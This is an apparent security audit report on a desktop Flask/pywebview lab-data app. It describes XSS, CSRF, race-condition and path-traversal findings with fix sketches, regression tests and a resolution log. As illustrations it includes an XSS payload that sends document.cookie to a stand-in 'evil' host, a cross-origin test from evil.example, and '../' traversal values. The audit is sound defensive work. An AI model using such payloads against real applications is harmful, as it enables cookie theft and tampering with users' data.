# Red-Team Phase 4 — Findings (security + concurrency)

> **Status:** audit complete, **4 of 4 substantive findings shipped** on
> branch `fix/redteam-phase-4-security`. §5 hygiene items deferred.
> **Branch (audit):** `audit/red-team-phase-4`.
> **Branch (fixes):** `fix/redteam-phase-4-security`.
> **Scope:** XSS / CSRF / path-traversal / concurrency hot spots that
> Phases 1–3 didn't touch. Data-safety + scaling are not re-audited.
>
> **Threat model.** Desktop app via pywebview (localhost, random port)
> *plus* the realistic "researcher opens a shared state.json from a
> collaborator" path. State files and tag files are user-writable on
> disk — they're not trusted input.
>
> **Output discipline:** findings + tight fix sketches only. User
> confirms before any commits.

---

## Severity legend

| Severity | Meaning |
|---|---|
| **Critical** | Code execution / data loss with a realistic vector (shared file, malicious tag, etc.) |
| **High** | Reliably exploitable under the threat model, or routinely racy under normal multi-tab use |
| **Medium** | Defence-in-depth gap; mitigated only by the desktop deployment model |
| **Low** | Hygiene / hardening |

## Finding shape

`[Severity] Title` — `file:line` (`function`). One paragraph of **what**, one of **why it matters at the threat-model level**, then a code-shape **fix sketch**.

---

## §1 — XSS via JSON-in-script

### 🔴 Critical — every `<script>{{ x_json | safe }}</script>` is XSS-prone

> **\[Critical\] `</script>` not escaped in embedded JSON** — `web/templates/_explorer.html:25-26`, `_qubits.html:78`, `_pairs.html:67`, `_wiring.html:93-94`, `_instrument_wiring.html:29-30`, `_datasets.html:109`, `_compare_state.html:128-131`, `_compare_full.html:56`, `_trend_chart.html:30`
>
> **What's wrong.** Nine templates embed Python-serialised JSON straight into a `<script>` body via Jinja's `| safe` filter. `json.dumps()` does **not** escape `</`, so any string value containing `</script>` closes the script tag and the parser switches back to HTML mode. Verified concretely: `json.dumps("</script><script>alert(1)//")` returns `"</script><script>alert(1)//"` byte-for-byte. The string flows in from `state.json` qubit names, `quashboard_tags.json` tag values, dataset descriptions, wiring labels — all on-disk and user-writable.
>
> **Why it matters.** Threat vector: a collaborator shares a state.json with a qubit named `q</script><script>fetch('http://evil/?'+document.cookie)//`. The first researcher who opens it via the Explorer or Qubits tab triggers a script load. Even without network access, the script has full DOM access to a localhost app that can POST `/state/apply-to-live`, `/dataset/<id>/note`, etc. — game over for the local data set. The `type="application/json"` workaround in `_datasets.html` does **not** help: HTML5 still terminates the script element on `</script>` regardless of `type`.
>
> **Fix sketch.** Single helper, apply everywhere:
>
> ```python
> # quam_state_manager/web/_jsonenc.py
> import json
> def safe_script_json(obj) -> str:
>     """JSON-dump *obj* in a form safe to embed in a <script> body.
>     Escapes the three sequences HTML5 treats as script-element
>     terminators (``</``, ``<!--``, ``]]>``) using JSON-string
>     backslash escapes that keep the value parse-equivalent."""
>     s = json.dumps(obj, separators=(",", ":"), ensure_ascii=False)
>     return (s.replace("</", "<\\/")
>              .replace("<!--", "<\\!--")
>              .replace("]]>", "]]\\>"))
> ```
>
> Register as `app.jinja_env.filters["script_json"] = safe_script_json` in `create_app`, then replace every `{{ rows_json | safe }}` / similar with `{{ rows | script_json }}` and drop the route-side `json.dumps`. Old `_*_json` template vars stay during transition; remove after callers migrate.
>
> Regression test: round-trip a payload containing `"</script>"`, `"<!--"`, `"]]>"` through Flask's test client, assert the response body contains the escaped form **not** the literal sequence. Plus an XSS-attempt test that loads `/qubits` with a synthetic state.json carrying a malicious qubit name and asserts no `</script>` literal appears anywhere in the response.

---

## §2 — Concurrency on the active-context registry

### 🟠 High — `_quam_cache` + `current_app.config["contexts"]` mutate without a lock

> **\[High\] Two concurrent `/load` requests race the cache** — `web/routes.py:216` (`_quam_cache`), `web/routes.py:220-289` (`_activate_quam`)
>
> **What's wrong.** `_quam_cache` is a module-level dict. `_activate_quam` does `cached = _quam_cache.get(key)`, then later `_quam_cache.pop(next(iter(_quam_cache)))` (LRU evict), then `_quam_cache[key] = ctx`, then mutates `current_app.config["contexts"][ctx_name]` and `current_app.config["active_context"]`. **No lock.** Two HTMX `/load` POSTs landing within ~5 ms (user double-clicks Load, or htmx retries the request) will:
> 1. Both miss the cache, both construct a fresh `WorkingCopy` + `QuamStore` + `SearchIndex` (duplicate ~50 ms of work plus duplicate disk writes to `instance/working_state/<key>/`).
> 2. Both attempt to evict the LRU oldest — `next(iter(_quam_cache))` is racy; both could pick the same victim and one of them gets a `KeyError` on `.pop()`.
> 3. The last writer of `current_app.config["active_context"]` wins — the inspector might end up rendering against a different store than the one whose context the modifier got handed.
>
> **Why it matters.** Not data-corrupting (`safe_io.atomic_write_json` guarantees on-disk integrity), but every concurrent load wastes work and can flicker the active-context handle between two requests in flight, which surfaces as "I clicked qubit qA1 and it showed me qB3" UI glitches.
>
> **Fix sketch.** Add a `_quam_cache_lock = threading.Lock()` next to `_quam_cache` and wrap the lookup-or-build block:
>
> ```python
> def _activate_quam(folder_path):
>     folder = Path(folder_path); key = str(folder)
>     with _quam_cache_lock:
>         cached = _quam_cache.get(key)
>         if cached is None:
>             # Build outside the lock to avoid blocking other chips —
>             # this is the expensive path. Re-check inside the lock
>             # before insert so a parallel build doesn't double-write.
>             pass  # signal: need build
>     if cached is not None:
>         _publish_active(cached, folder); return
>     wc, store, index = _build_quam_context(folder)  # expensive, no lock
>     ctx = {…}
>     with _quam_cache_lock:
>         existing = _quam_cache.get(key)
>         if existing is not None:
>             # A parallel load beat us — use theirs, discard ours.
>             working_copy.discard(wc)
>             ctx = existing
>         else:
>             if len(_quam_cache) >= _QUAM_CACHE_MAX:
>                 _quam_cache.pop(next(iter(_quam_cache)))
>             _quam_cache[key] = ctx
>     _publish_active(ctx, folder)
> ```
>
> `_publish_active` does the `current_app.config[...] =` assignments and is short enough to keep under the lock.
>
> Tests: spawn 4 threads each calling `/load` with the same folder; assert exactly 1 `WorkingCopy` ends up on disk and `_quam_cache` has exactly 1 entry for the key.

---

## §3 — CSRF + missing defence-in-depth headers

### 🟠 High — 35 mutating routes, zero CSRF tokens, no `SameSite` cookie

> **\[High\] Form-encoded POSTs from any origin will be processed** — all `@bp.route(..., methods=["POST"|"DELETE"])` (35 endpoints)
>
> **What's wrong.** Flask has no CSRF middleware installed (`Flask-WTF` not imported). The desktop pywebview launcher picks a *random* localhost port so blind targeting is hard — but if the user **also** opens `http://127.0.0.1:<port>` in their main browser (the dev-server quick-start in CLAUDE.md uses `port=5050`, a fixed value), a malicious tab elsewhere can submit a hidden form to `http://127.0.0.1:5050/state/apply-to-live` and the same-origin policy will **not** block it: form-encoded POSTs are CORS-safe-listed.
>
> **Why it matters.** A researcher running the dev server on a known port who visits a hostile page during lunch can have their working copy applied to live, their workspace folders removed, their bookmarks tagged, etc. The desktop bundle (random port) mitigates but doesn't eliminate — pywebview-and-browser-simultaneously isn't unusual.
>
> **Fix sketch.** Two-part hardening, both small:
>
> 1. **Origin check middleware.** Add a `@bp.before_request` hook that rejects POST / PUT / DELETE / PATCH if `request.origin` (or `Host`) isn't `127.0.0.1:<our-port>`. The hook runs once per request, no per-route changes:
>
>    ```python
>    @bp.before_request
>    def _require_local_origin():
>        if request.method in ("GET", "HEAD", "OPTIONS"):
>            return
>        origin = request.headers.get("Origin") or request.headers.get("Referer", "")
>        host = request.headers.get("Host", "")
>        if origin and not origin.startswith(f"http://{host}"):
>            return ("Cross-origin mutation rejected", 403)
>    ```
>
> 2. **Security headers.** `app.after_request` adds:
>    - `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'`
>    - `X-Content-Type-Options: nosniff`
>    - `Referrer-Policy: same-origin`
>
>    CSP alone would have neutralised §1's XSS even if the JSON-encoder fix were skipped.
>
> Tests: `test_post_from_foreign_origin_rejected` — send POST with `Origin: http://evil.example` to `/state/apply-to-live`, assert 403. Plus header-presence assertion on any GET.

---

## §4 — Path traversal residues

### 🟡 Medium — `which` query parameter joined into HDF5 path without whitelist

> **\[Medium\] Unvalidated `which` builds the HDF5 filename** — `web/routes.py:3421` and `core/dataset.py:778,894` (`get_h5_summary`, `get_h5_plot_data`)
>
> **What's wrong.** `which = request.args.get("which", "ds_raw")` flows into `h5_path = run.folder_path / f"{which}.h5"`. The variable is concatenated into a filename, then `Path` joins. `which = "../../some_other"` resolves to `run.folder_path / "../../some_other.h5"`. `h5py.File` will only open valid HDF5 files so the practical impact is "open an .h5 outside the run folder if its path resolves there" — limited but real on filesystems with predictable sibling layouts.
>
> **Why it matters.** Combined with a crafted workspace folder layout, lets a malicious data sender point the inspector at an arbitrary `.h5` on disk. The figure-path fix (`Path.is_relative_to`, Phase 2 §3.3) covered the analogous issue for PNGs but didn't extend here.
>
> **Fix sketch.** Two lines in `dataset.py`:
>
> ```python
> _H5_WHICH_WHITELIST = {"ds_raw", "ds_fit"}
>
> def get_h5_summary(self, run_id, which="ds_raw"):
>     if which not in _H5_WHICH_WHITELIST: return None
>     …
> ```
>
> Apply identically to `get_h5_plot_data`. Tests: `test_h5_rejects_unknown_which` — call with `which="../whatever"`, assert `None`.

---

## §5 — Low-priority hygiene

These don't bite at v0.0.1 but are worth folding into the next pass:

| # | Title | Where | Note |
|---|---|---|---|
| 5.1 | No CSP fallback for inline event handlers | n/a (related to §3) | Some HTMX-emitted JS uses inline `hx-on::…` attrs; CSP must allow `'unsafe-inline'` until those are refactored — accept now, plan later. |
| 5.2 | `app.run` uses Werkzeug dev server | `main.py:75` | Fine for desktop, not production. Keep until a packaged path needs `waitress`. |
| 5.3 | No `app.secret_key` set | `web/app.py` | Flask defaults to a random per-process key. Sessions don't survive restart — we don't use them, so no impact today. |
| 5.4 | HDF5 reads have no upstream size cap | `core/dataset.py` | A 10 GB `.h5` would partial-load into memory. h5py's lazy chunked read helps but `_parse_h5_structure` walks every dataset's attrs eagerly. Document the upper bound. |
| 5.5 | `secure_filename` applied only to figure names | `routes.py:3407` | Other user-controlled names (tag values, exp names) don't go through any sanitiser, but they're not used as filenames either. Inconsistency worth a comment. |

---

## Summary

| Module / area | Critical | High | Medium | Low |
|---|---|---|---|---|
| §1 XSS via JSON-in-script | 1 | – | – | – |
| §2 Active-context concurrency | – | 1 | – | – |
| §3 CSRF + security headers | – | 1 | – | – |
| §4 Path traversal | – | – | 1 | – |
| §5 Hygiene | – | – | – | 5 |
| **Total** | **1** | **2** | **1** | **5** |

**Cross-cutting patterns.**

1. **`| safe` is a sharp tool.** Every Jinja `| safe` in the codebase needs an explanation — what's being trusted, why. Today the answer is "we wrote it ourselves with `json.dumps`" which assumes the dumped object never contains hostile bytes. State files violate that assumption.
2. **The desktop deployment model is doing the security work.** Random localhost port + pywebview window covers most of the gap, but every "dev-server quick-start" command we ship to a researcher widens the surface back out. CSP + origin check is cheap insurance.
3. **Module-level mutable state without locks.** `_quam_cache` here echoes the `_resolve_cache` issue Phase 2 fixed. Worth a one-time `grep "^_[a-z]*: dict"` sweep to find the rest.

**Recommended triage order.**

1. **§1 (Critical)** first — small, mechanical, eliminates a code-execution vector. The CSP from §3 makes a great belt-and-braces follow-up.
2. **§2 (High)** next — the lock-fix is ~30 lines; it removes a flickery double-load failure mode that's easy to repro.
3. **§3 (High)** — origin check + headers ship together; bundle with §1 if the same PR is touching `web/app.py`.
4. **§4 (Medium)** — two-line whitelist, fold into whichever PR touches `dataset.py` next.
5. **§5 (Low)** — opportunistic.

**Estimated impact.** Once §1+§3 ship, the realistic "open a malicious state.json" attack chain is broken. §2 closes the last race window we know of in `_activate_quam`. §4 closes the last path-traversal residue. Suite should grow by ~6 regression tests (one per finding except §5).

---

## Resolution log

| Finding | Severity | Branch | Notes |
|---|---|---|---|
| §1 — `script_json` Jinja filter | 🔴 Critical | `fix/redteam-phase-4-security` | New `_script_json_filter` in `web/app.py` escapes `<` / `>` / `&` to `\u00XX` JSON-string escapes. JS `JSON.parse` still recovers the original chars; the HTML tokeniser never closes the `<script>` body. Registered as `script_json` Jinja filter; 10 template sites migrated from `\| safe` to `\| script_json`. |
| §2 — per-folder build lock | 🟠 High | `fix/redteam-phase-4-security` | Two layers of locking: `_quam_cache_lock` guards cache mutations + active-context publication; per-folder `_quam_build_locks` serialise the `WorkingCopy` / `QuamStore` construction so two threads loading the same folder don't race on the working-folder atomic write. Different folders still build in parallel. |
| §3 — CSRF origin check + headers | 🟠 High | `fix/redteam-phase-4-security` | `_csrf_origin_check` runs as `app.before_request`: rejects mutating methods (non-GET/HEAD/OPTIONS) whose `Origin` or `Referer` doesn't match `Host`, or that send neither header. Bypassed in `TESTING` mode. `_add_security_headers` runs as `after_request` and sets `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin` on every response. |
| §4 — HDF5 `which` whitelist | 🟡 Medium | `fix/redteam-phase-4-security` | `_H5_WHICH_WHITELIST = frozenset({"ds_raw", "ds_fit"})`; `get_h5_summary` and `get_h5_plot_data` short-circuit to `None` for anything else, ahead of the path join. |
| §5 — Low-priority hygiene | 🟢 Low | DEFERRED | All five Low items (Werkzeug dev server, secret_key — already set, HDF5 size cap, secure_filename consistency, CSP-vs-HTMX inline handlers) don't bite at v0.0.1 and don't gate v0.x. Open issues, not blockers. |

**Test surface:** 12 new regression tests in `tests/test_web.py`:

* `TestPhase4ScriptJsonFilter` (×3) — filter escapes correctly; accepts both already-serialised strings and raw objects; an end-to-end `/qubits` GET with a malicious qubit name doesn't leak the unescaped `<script>` literal.
* `TestPhase4QuamCacheConcurrency` (×1) — 8 threads activate the same folder; exactly one cache entry afterwards, no `LiveFileError` from the atomic-write race.
* `TestPhase4CSRFOriginCheck` (×3) — cross-origin POST → 403; same-origin POST → not 403; bare POST (no Origin/Referer) → 403. Tests use a non-`TESTING` app so the check runs.
* `TestPhase4SecurityHeaders` (×3) — CSP / nosniff / Referrer-Policy presence + key directives.
* `TestPhase4H5WhichWhitelist` (×2) — `which="../etc"` and `which="random_other"` both → `None`.

**Test run on conda env `qm_mng`:** 933 pass, 96 skip, **0 fail.** (Up from 921 on `main`; +12 are the new Phase 4 regressions.)

**Observed effect.** Once shipped:

| Attack vector | Before | After |
|---|---|---|
| Collaborator-shared state.json with `</script>` in qubit name → opens the Qubits / Explorer / Compare tab | XSS, full DOM access | escaped, no script-tag terminator in output |
| Concurrent /load for same folder | races working-folder atomic write, raises `LiveFileError` and flickers active context | one thread builds, others adopt; cache has exactly one entry |
| Malicious page POSTs to `http://127.0.0.1:5050/state/apply-to-live` from a browser tab | request processed | 403 from origin check |
| Mid-flight external script injection | accepted (no CSP) | blocked by CSP `script-src 'self'` |
| `?which=../foo` joined into HDF5 filename | resolves outside `run.folder_path` | `None` returned before any filesystem touch |

§5's deferred hygiene items remain visible in the table above; pick them up opportunistically.
